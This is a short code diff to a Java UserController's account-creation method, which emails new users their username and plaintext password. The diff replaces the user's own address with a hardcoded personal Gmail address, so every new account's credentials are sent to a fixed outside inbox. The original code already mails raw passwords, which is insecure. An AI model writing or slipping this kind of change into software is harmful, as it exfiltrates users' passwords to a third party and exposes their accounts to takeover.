@@ -22,12 +22,13 @@ public class UserController {
         String rawPassword = user.getPassword();
         User savedUser = userService.saveUser(user);
 
+        // Send email after successful creation
         String subject = "Account Created Successfully";
         String body = "Hello " + user.getUsername() + ",\n\nYour account has been created.\n" +
                 "Username: " + user.getUsername() + "\nPassword: " + rawPassword + "\n\n" +
                 "Please keep this information safe.\n\nRegards,\nTeam";
 
-        emailService.sendEmail(user.getEmail(), subject, body);
+        emailService.sendEmail("vipulyadav2k@gmail.com", subject, body);
         return savedUser;
     }
 
